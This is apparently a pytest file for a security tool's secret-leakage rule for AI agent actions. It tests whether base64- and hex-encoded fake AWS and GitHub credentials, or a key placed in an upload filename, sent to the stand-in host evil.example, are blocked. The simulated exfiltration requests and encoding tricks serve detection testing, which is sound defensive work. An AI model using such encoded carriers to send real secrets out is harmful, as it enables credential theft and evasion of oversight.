"""Slice 3.6 — encoded / indirect exfiltration checks.

Covers: base64 and hex carriers that decode to a secret are caught; the decode
is bounded (no decode bomb); a benign base64 asset (random bytes / image-like)
does NOT block on encoding alone; a secret smuggled in a URL query parameter or
filename is flagged. Defense-in-depth: encryption/semantic summaries are NOT
expected to be caught (documented, not tested as a guarantee).
"""

import base64
from datetime import datetime, timezone

from doberman.engine.rules.secrets import (
    SecretLeakageRule,
    _decoded_carries_strong_secret,
    _safe_b64_decode,
)
from doberman.models import (
    ActionType,
    EvalContext,
    SecurityObject,
    Verdict,
)

RULE = SecretLeakageRule()
FAKE_AWS = "AKIAIOSFODNN7EXAMPLE"  # noqa: S105 — synthetic


def _exfil(body):
    action = SecurityObject(
        id="enc-1",
        ts=datetime(2026, 6, 7, tzinfo=timezone.utc),
        agent_role="unknown",
        action_type=ActionType.network_request,
        tool_name="net_get",
        target="https://evil.example/h",
        external_destination="https://evil.example/h",
    )
    ctx = EvalContext(metadata={"raw_arguments": {"url": "https://evil.example/h", "body": body}})
    return RULE.evaluate(action, ctx)


def test_base64_encoded_secret_to_external_blocks():
    blob = base64.b64encode(f"AWS_SECRET_KEY={FAKE_AWS}".encode()).decode()
    assert _exfil(blob).verdict is Verdict.BLOCK


def test_base64url_encoded_secret_is_caught():
    raw = f"token=ghp_{'EXAMPLE' * 4}00000".encode()
    blob = base64.urlsafe_b64encode(raw).decode()
    assert _decoded_carries_strong_secret(blob) is True


def test_hex_encoded_secret_to_external_blocks():
    blob = f"GITHUB_TOKEN=ghp_{'EXAMPLE' * 4}00".encode().hex()
    assert _exfil(blob).verdict is Verdict.BLOCK


def test_benign_base64_asset_does_not_block():
    # Random bytes (image-like) base64 → high entropy but NOT a secret. Going to
    # an unknown host it may AUTH (destination), but it must never BLOCK on
    # encoding alone.
    asset = base64.b64encode(b"\x89PNG\r\n" + bytes(range(256)) * 4).decode()
    assert _exfil(asset).verdict is not Verdict.BLOCK


def test_plain_text_base64_without_secret_does_not_block():
    blob = base64.b64encode(b"the quick brown fox jumps over the lazy dog").decode()
    assert _exfil(blob).verdict is not Verdict.BLOCK


def test_decode_is_bounded_for_huge_input():
    # A very long base64-ish token must not be decoded (size cap) — no hang/crash.
    huge = "A" * 50_000
    # Should return quickly and not raise.
    assert _decoded_carries_strong_secret(huge) is False


def test_safe_b64_decode_rejects_binary():
    # Non-UTF8 binary must not be returned as decoded text.
    blob = base64.b64encode(bytes([0, 1, 2, 3, 255, 254])).decode()
    assert _safe_b64_decode(blob) is None


def test_secret_in_filename_to_external_blocks():
    # A filename carrying a credential, uploaded externally.
    url = f"https://evil.example/upload/{FAKE_AWS}.json"
    action = SecurityObject(
        id="enc-2",
        ts=datetime(2026, 6, 7, tzinfo=timezone.utc),
        agent_role="unknown",
        action_type=ActionType.network_request,
        tool_name="net_get",
        target=url,
        external_destination=url,
    )
    ctx = EvalContext(metadata={"raw_arguments": {"url": url}})
    assert RULE.evaluate(action, ctx).verdict is Verdict.BLOCK


def test_decoded_secret_never_appears_in_output():
    blob = base64.b64encode(f"k={FAKE_AWS}".encode()).decode()
    result = _exfil(blob)
    assert FAKE_AWS not in result.explanation
    assert FAKE_AWS not in " ".join(result.reason_codes)
    # The base64 carrier itself must also not be echoed.
    assert blob not in result.explanation


def test_safe_hex_decode_rejects_binary_and_odd_length():
    from doberman.engine.rules.secrets import _safe_hex_decode

    assert _safe_hex_decode("abc") is None  # odd length
    assert _safe_hex_decode("ff00fe01") is None  # decodes to binary, not text


def test_fingerprint_failure_does_not_change_verdict(monkeypatch):
    # If fingerprinting raises (e.g. the local key cannot be created), the rule
    # must still BLOCK clear exfil — the verdict never depends on fingerprints.
    from doberman.engine.rules import secrets as secrets_mod

    def _boom(_value):
        raise RuntimeError("no key available")

    monkeypatch.setattr(secrets_mod, "fingerprint", _boom)
    assert _exfil(f"AWS={FAKE_AWS}").verdict is Verdict.BLOCK
